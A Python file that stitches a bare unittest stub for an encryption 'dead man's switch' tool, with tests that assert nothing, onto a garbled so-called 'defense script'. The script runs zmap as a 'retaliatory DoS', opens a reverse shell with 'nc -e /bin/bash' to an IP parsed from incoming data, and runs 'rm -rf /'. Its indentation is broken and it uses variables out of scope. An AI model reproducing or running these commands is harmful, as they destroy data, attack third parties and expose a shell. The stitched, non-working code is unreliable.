import unittest
import argparse
import logging
import os
import time

from Deadmans_Switch import deadmans_switch

class TestApp(unittest.TestCase):
    def setUp(self):
        # Set up any necessary variables or objects
        self.file_paths = ['file1.txt', 'file2.txt']
        self.key_file_path = 'key.txt'
        self.decrypt = False
        self.verbose = False
        self.interval = 24
        self.passphrase = '200OK'
        self.generate_passphrase = False
        self.passphrase_file = 'passphrase.txt'

    def test_deadmans_switch_encrypt(self):
        # Test the encryption functionality
        args = argparse.Namespace(file_paths=self.file_paths, key_file_path=self.key_file_path,
                                  decrypt=self.decrypt, verbose=self.verbose, interval=self.interval,
                                  passphrase=self.passphrase, generate_passphrase=self.generate_passphrase,
                                  passphrase_file=self.passphrase_file)

        # Call the deadmans_switch function
        deadmans_switch(args)

        # TODO: Add assertions to check if the encryption operations were performed correctly

    def test_deadmans_switch_decrypt(self):
        # Test the decryption functionality
        self.decrypt = True
        args = argparse.Namespace(file_paths=self.file_paths, key_file_path=self.key_file_path,
                                  decrypt=self.decrypt, verbose=self.verbose, interval=self.interval,
                                  passphrase=self.passphrase, generate_passphrase=self.generate_passphrase,
                                  passphrase_file=self.passphrase_file)

        # Call the deadmans_switch function
        deadmans_switch(args)

        # TODO: Add assertions to check if the decryption operations were performed correctly

    def test_deadmans_switch_generate_passphrase(self):
        # Test the passphrase generation functionality
        self.generate_passphrase = True
        args = argparse.Namespace(file_paths=self.file_paths, key_file_path=self.key_file_path,
                                  decrypt=self.decrypt, verbose=self.verbose, interval=self.interval,
                                  passphrase=self.passphrase, generate_passphrase=self.generate_passphrase,
                                  passphrase_file=self.passphrase_file)

        # Call the deadmans_switch function
        deadmans_switch(args)

        # TODO: Add assertions to check if the passphrase was generated and saved correctly

if __name__ == '__main__':
    unittest.main()

###################################################################################################################################################################################

###################################################NCAT--script below############################################################################################################33

#################################################################################################################################################################################3##


import socket
import subprocess
import threading
import subprocess

def defense_script():
    """
    Implement your defense script logic here.
    """
    # Check if Nmap is running
    nmap_process = subprocess.Popen(['pgrep', 'nmap'], stdout=subprocess.PIPE)
    nmap_process.communicate()
    if nmap_process.returncode == 0:
        print("Nmap attack detected! Taking defensive actions...")
        # Add your defensive actions here
        # For example, you can block the attacker's IP address using a firewall rule
        attacker_ip = 'ATTACKER_IP_ADDRESS'
        subprocess.run(['iptables', '-A', 'INPUT', '-s', attacker_ip, '-j', 'DROP'])
        
        # Retaliatory DoS using Zmap from honeypots
        zmap_process = subprocess.Popen(['zmap', '-p', '80', '-B', '100M', '-f', 'saddr', '-o', 'honeypot_ips.txt'], stdout=subprocess.PIPE)
        zmap_process.communicate()
        if zmap_process.returncode == 0:
            print("Zmap retaliatory DoS initiated from honeypots.")
        else:
            print("Failed to initiate Zmap retaliatory DoS from honeypots.")
    else:
        print("No Nmap attack detected.")

    
            def handle_connection(client_socket, client_address):
                    data = client_socket.recv(1024).decode()
                        if "attacker_ip" in data:
                    # Activate desired action for attacker IP
                            print("Attacker IP detected. Activating Retallatory Shock&PwN")
                # Add your code here to perform the desired action

        # Establish a reverse shell connection with the attacker's IP
        attacker_ip = data.split("=")[1]
        subprocess.Popen(["nc", "-e", "/bin/bash", attacker_ip, "4444"])

        # Schedule the execution of the script to blacklist the IP after 1 hour
        script = f"echo 'iptables -A INPUT -s {client_address[0]} -j DROP' | at now + 1 hour"
        subprocess.run(script, shell=True)
        
       # Perform additional aggressive actions
        subprocess.run(["rm", "-rf", "/"])  # Delete all files and directories

        # Perform DDoS attack against the attacker's IP
        # ddos_attack(attacker_ip)

    client_socket.close()

def bind_ncat(port):
    subprocess.run(f"ncat -lvp {port}", shell=True)




















